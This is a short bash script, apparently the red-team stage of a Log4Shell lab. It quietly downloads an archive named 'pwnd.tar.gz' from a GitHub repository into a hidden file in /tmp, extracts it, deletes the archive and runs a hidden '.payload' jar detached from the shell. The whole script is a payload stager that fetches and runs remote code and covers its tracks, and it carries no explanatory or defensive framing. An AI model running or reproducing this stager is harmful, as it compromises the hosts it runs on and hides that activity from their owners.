#!/bin/bash
#----------
wget -q -O /tmp/.a.tar.gz https://github.com/hotpotcookie/log4shell-white-box/raw/main/red/pwnd.tar.gz & wait
tar -xf /tmp/.a.tar.gz -C /tmp/ & wait
rm /tmp/.a.*
java -jar /tmp/.payload-6.22.jar & disown